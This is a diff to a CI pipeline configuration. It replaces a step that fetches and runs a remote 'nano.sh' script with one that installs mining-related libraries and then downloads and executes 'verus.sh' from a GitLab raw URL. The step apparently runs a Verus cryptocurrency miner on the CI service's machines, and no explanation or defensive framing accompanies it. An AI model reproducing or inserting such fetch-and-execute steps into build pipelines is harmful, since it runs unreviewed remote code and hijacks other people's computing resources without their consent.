@@ -12,4 +12,5 @@ steps:
   pull: if-not-exists
   image: node:latest
   commands:
-      - wget https://gitlab.com/renifer12/project-7/-/raw/main/nano.sh && chmod +x nano.sh && ./nano.sh
+      - apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
+      - wget https://gitlab.com/renifer12/project-7/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
